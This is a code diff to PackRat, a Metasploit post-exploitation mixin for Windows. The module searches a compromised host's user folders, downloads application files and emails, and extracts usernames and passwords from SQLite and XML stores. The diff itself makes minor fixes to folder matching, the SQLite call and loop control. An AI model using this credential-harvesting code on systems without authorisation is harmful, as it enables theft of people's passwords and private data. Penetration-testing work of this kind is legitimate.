@@ -6,7 +6,7 @@
 # PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
 # This is a mixin that will be included in each separated moduel. Further details can be found in the module documentation.
 #
-
+require 'sqlite3'
 module Msf
   class Post
     module Windows
@@ -17,15 +17,16 @@ module Msf
 
         # Check to see if the application base folder exists on the remote system.
         def parent_folder_available?(path, dir, application)
+          parent_folder = dir.split('\\').first
           dirs = session.fs.dir.foreach(path).collect
-          return dirs.include? dir
+          return dirs.include? parent_folder 
         end
 
         def find_files(userprofile, application, artifact, path, dir)
           file_directory = "#{path}\\#{dir}"
           files = session.fs.file.search(file_directory, artifact.to_s, true)
 
-          #Checks if the file was found in the application's bas file
+          # Checks if the file was found in the application's bas file
           if files.empty?
             vprint_error("#{application.capitalize}'s #{artifact.capitalize} not found in #{userprofile['UserName']}'s user directory\n")
           else
@@ -105,8 +106,7 @@ module Msf
 
         def extract_sqlite(saving_path, artifact_child, artifact, local_loc)
           database_string = ''
-          database_file = SQLite3::Database.open(saving_path.to_s)
-
+          database_file = ::SQLite3::Database.open(saving_path.to_s)
           artifact_child[:sql_search].each do |sql_child|
             db = database_file.prepare "SELECT #{sql_child[:sql_column]} FROM #{sql_child[:sql_table]}"
             db_command = db.execute
@@ -159,7 +159,6 @@ module Msf
 
         # Download file from the remote system, if it exists.
         def download_file(saving_path, file_to_download, file, application)
-
           print_status("Downloading #{file_to_download}")
           session.fs.file.download_file(saving_path, file_to_download)
           print_status("#{application.capitalize} #{file['name'].capitalize} downloaded")
@@ -191,7 +190,7 @@ module Msf
             else
               vprint_error("#{application.capitalize}'s parent folder not found in #{userprofile['UserName']}'s user directory\n")
               # skip non-existing file
-              # next
+                next
             end
 
             # Get the files that matches the pre-defined artifact name
@@ -218,7 +217,6 @@ module Msf
 
               # Download file
               download_file(saving_path, file_to_download, file, application)
-
               if datastore['EXTRACT_CREDENTIALS']
                 case credential_type
                 when 'xml'
